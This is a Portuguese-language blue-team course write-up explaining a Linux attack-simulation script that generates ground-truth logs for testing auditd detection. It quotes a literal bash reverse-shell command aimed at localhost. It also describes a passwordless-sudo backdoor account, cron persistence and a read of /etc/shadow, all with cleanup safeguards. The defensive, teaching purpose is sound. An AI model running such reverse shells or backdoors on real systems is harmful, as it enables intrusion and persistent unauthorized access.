# O que você precisa fazer

Esse é o par Linux do `9-windows_attack_sim.ps1`: mesmo papel de "atacante controlado", mesma lógica de gerar `linux_attack_log.json` como ground truth para a Tarefa 12 correlacionar depois. A diferença é que aqui o script mexe com root, sudoers e um reverse shell de verdade (ainda que inofensivo) — então a engenharia de segurança em volta das seis ações é mais pesada do que no lado Windows.

## Passo 1 — Um `trap cleanup EXIT` garante que a limpeza roda mesmo se o script morrer no meio

Logo depois de confirmar que está rodando como root, o script já registra `trap cleanup EXIT` — antes de qualquer ação arriscada acontecer. O comentário no cabeçalho do arquivo resume o motivo: "this project never leaves a passwordless-sudo backdoor account behind because one command in the middle of the sequence errored". Com `set -euo pipefail` ativo, qualquer comando que falhe sem tratamento mataria o script imediatamente — o `trap` garante que, mesmo assim, `userdel`, a remoção do `/etc/sudoers.d/backdoor`, do binário em `/tmp` e do `/etc/cron.d/persistence_test` ainda rodem. Por isso quase todo comando "perigoso" no script termina em `2>/dev/null || true`: isso evita que uma falha esperada (por exemplo, usuário já existente) dispare o `set -e` cedo demais, mas o trap continua sendo a rede de segurança final.

## Passo 2 — Segurança: o reverse shell é seguro por construção, não por sorte

A Ação 4 roda de verdade um reverse shell bash (`bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &`), mas o comentário no código explica exatamente por que isso é seguro: o alvo é `127.0.0.1` (nunca sai da própria máquina), nada está escutando na porta 4444 a menos que alguém tenha configurado isso deliberadamente, e o shell em segundo plano é morto um segundo depois via `kill %1 2>/dev/null || true`, independente de a conexão ter "funcionado" ou não. Isso gera exatamente o padrão de tráfego (`/dev/tcp/`, conexão de saída) que um sensor de auditd deveria capturar, sem que o script realmente abra uma porta de C2 ou dê a alguém acesso à máquina.

## Passo 3 — O script escalona pausas de propósito para não contaminar a própria janela de detecção da Tarefa 12

Duas esperas concretas no meio do script não são acidente: `sleep 65` antes da Ação 6 (ler `/etc/shadow`) e `sleep 35` antes de rodar a limpeza. O comentário explica: a Tarefa 12 (`12-linux_detection_proof.sh`) busca eventos numa janela de ±30 segundos ao redor de cada timestamp, e tanto a Ação 1 (`useradd`) quanto a limpeza final (`userdel`) carregam a mesma chave de auditoria `identity` que a Ação 6 espera. Sem essas pausas, a leitura de `/etc/shadow` na Ação 6 poderia "roubar" crédito de um evento de `useradd`/`userdel` vizinho só porque as janelas de busca se sobrepõem — 65s (mais que o dobro dos 30s) e 35s (mais que 30s) garantem que as janelas nunca se toquem.

## Passo 4 — O script documenta de propósito que a Ação 6 é esperada para dar MISSED

O comentário antes da Ação 6 é direto: a regra de identidade do auditd (Task 10 do módulo 2x00) monitora `/etc/shadow` com `-p wa` (write + attribute-change), não leitura — então `cat /etc/shadow > /dev/null` não deveria disparar nada. Em vez de "trapacear" e escolher uma fonte esperada que sempre vai capturar, o script registra honestamente `"auditd"`/`"identity"` como fonte esperada mesmo sabendo que ela provavelmente vai falhar, porque essa lacuna de cobertura é justamente o tipo de achado real que a Tarefa 14 (avaliação de cobertura) precisa enxergar.

## Passo 5 — A mesma escrita em `/etc/cron.d/` pode acabar rotulada com uma chave de auditoria diferente da que você esperaria

O comentário da Ação 5 explica que `/etc/cron.d/` é monitorado pela chave `cron_config` da Task 10 do módulo 2x00, não pela `cron_persist` da Task 5 deste módulo (que só cobre `/var/spool/cron/`). Como o subsistema de auditoria do kernel só marca um evento com UMA chave mesmo quando duas regras `-w` diferentes cobrem o mesmo caminho, o resultado final depende de qual regra foi registrada primeiro — por isso o ground truth já grava `"cron_config"` como a chave esperada, em vez de assumir a chave "óbvia" pelo nome.

## Onde entregar

O arquivo final vai como `11-linux_attack_sim.sh` (que gera `linux_attack_log.json` como ground truth), no repositório `dlh-cyber_security`, diretório `blue_team/2x02_eyes_on_endpoint`.
